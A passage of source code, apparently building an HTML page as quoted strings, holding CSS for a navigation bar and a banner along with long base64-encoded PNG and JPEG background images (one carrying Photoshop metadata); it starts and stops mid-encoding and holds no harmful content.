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');\n"
                   "      background-size: cover;\n"
                   "    }\n"
                   "    nav {\n"
                   "      display: flex;\n"
                   "      justify-content: space-between;\n"
                   "      align-items: center;\n"
                   "      background-color: #FFC72C;\n"
                   "      padding: 20px;\n"
                   "      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);\n"
                   "    }\n"
                   "    nav ul {\n"
                   "      display: flex;\n"
                   "      list-style: none;\n"
                   "      margin: 0;\n"
                   "      padding: 0;\n"
                   "    }\n"
                   "    nav li {\n"
                   "      margin: 0 10px;\n"
                   "    }\n"
                   "    nav a {\n"
                   "      color: #000;\n"
                   "      text-decoration: none;\n"
                   "      font-size: 18px;\n"
                   "      font-weight: 600;\n"
                   "      text-transform: uppercase;\n"
                   "    }\n"
                   "    .banner {\n"
                   "      background-image:url('data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABQAAD/4QO6aHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjMtYzAxMSA2Ni4xNDU2NjEsIDIwMTIvMDIvMDYtMTQ6NTY6MjcgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcFJpZ2h0cz0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3JpZ2h0cy8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bXBSaWdodHM6TWFya2VkPSJGYWxzZSIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ1dWlkOjUwODVGRTFDNUNGMURDMTE4NDk5OUIyRDQ3M0I0MEM1IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjk5NzI1RDgwNERBMjExRTNBRkQyOUQ5NDZBRTkxODAwIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjJGMjEwOTNDNEQ4ODExRTNBRkQyOUQ5NDZBRTkxODAwIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDUzYgKE1hY2ludG9zaCkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpERUUyMEQ1QjcyMjI2ODExOEMxNEM0QzRCNUY5QTI4MSIgc3RSZWY6ZG9jdW1lbnRJRD0i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